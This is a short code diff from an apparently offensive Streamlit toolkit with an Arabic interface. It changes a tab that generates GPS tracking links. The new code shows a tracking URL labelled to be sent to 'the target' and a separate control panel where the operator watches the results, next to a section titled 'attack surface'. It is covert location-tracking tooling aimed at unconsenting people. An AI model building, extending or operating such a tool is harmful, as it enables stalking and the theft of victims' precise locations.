@@ -241,9 +241,16 @@ with tabs[4]:
         st.markdown("#### 🔗 توليد رابط تتبع GPS")
         st.info("استخدم هذه الميزة للحصول على إحداثيات GPS دقيقة.")
         if st.button("توليد رابط تتبع جديد"):
-            link = location_tracker.generate_tracking_link()
-            st.success(f"تم توليد الرابط بنجاح:")
-            st.code(link, language="text")
+            res = location_tracker.generate_tracking_link()
+            st.success(f"تم توليد الروابط بنجاح:")
+            
+            st.markdown("#### 🔗 رابط التتبع (أرسله للهدف):")
+            st.code(res["tracking_url"], language="text")
+            
+            st.markdown("#### 📊 لوحة التحكم (افتحه أنت لمتابعة النتائج):")
+            st.code(res["log_url"], language="text")
+            st.link_button("فتح لوحة التحكم الآن", res["log_url"])
+            
             st.markdown(location_tracker.get_tracking_instructions())
 
 # 5. سطح الهجوم
